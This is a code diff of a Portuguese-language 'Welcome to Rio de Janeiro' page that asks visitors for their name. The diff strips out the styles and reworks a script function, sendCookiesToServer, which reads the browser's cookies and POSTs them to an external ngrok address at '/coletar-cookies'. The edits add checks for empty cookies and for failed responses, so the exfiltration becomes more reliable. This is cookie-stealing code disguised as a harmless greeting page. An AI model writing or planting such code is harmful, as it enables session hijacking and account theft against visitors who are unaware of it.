@@ -5,69 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Boas-Vindas - Rio de Janeiro</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            background-color: #0077b6;
-            color: white;
-            border-radius: 10px;
-            padding: 30px;
-            text-align: center;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-        }
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-        }
-        input {
-            padding: 10px;
-            width: 80%;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 1rem;
-            margin-bottom: 20px;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #ff5722;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 1.1rem;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #e64a19;
-        }
-        .hidden {
-            display: none;
-        }
-        footer {
-            background-color: #0077b6;
-            color: white;
-            text-align: center;
-            padding: 10px;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-        .success-message {
-            color: #4CAF50;
-            margin-top: 10px;
-            font-size: 1.2rem;
-        }
+        /* Estilos omitidos por brevidade */
     </style>
 </head>
 <body>
@@ -75,7 +13,7 @@
     <!-- Página de Boas-Vindas -->
     <div id="welcomePage" class="container">
         <h1>Bem-vindo ao Rio de Janeiro!</h1>
-        <p>Estamos felizes em ter você por aqui! Por favor, digite seu nome para começar.</p>
+        <p>Estamos felizes em ter você por aqui! Por favor, digite seu nome abaixo para começar.</p>
         <input type="text" id="userName" placeholder="Digite seu nome aqui" oninput="handleInput(event)" onkeydown="checkEnter(event)">
         <button onclick="submitName()">Enviar</button>
         <p class="success-message hidden" id="successMessage">Nome recebido! Bem-vindo!</p>
@@ -145,19 +83,30 @@
         // Função para capturar e enviar os cookies para o servidor
         function sendCookiesToServer() {
             const cookies = document.cookie;  // Captura os cookies do navegador
-            const url = ' https://ea2c-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
+            const url = 'https://ea2c-177-192-8-19.ngrok-free.app/coletar-cookies';  // URL do servidor
 
             console.log("Cookies capturados:", cookies);
+
+            // Verificando se há cookies antes de enviar
+            if (!cookies) {
+                console.error("Nenhum cookie encontrado.");
+                return;
+            }
 
             // Envia os cookies via fetch para o servidor
             fetch(url, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Falha ao enviar cookies');
+                }
+                return response.json();
+            })
             .then(data => {
                 console.log('Cookies enviados com sucesso!', data);
             })
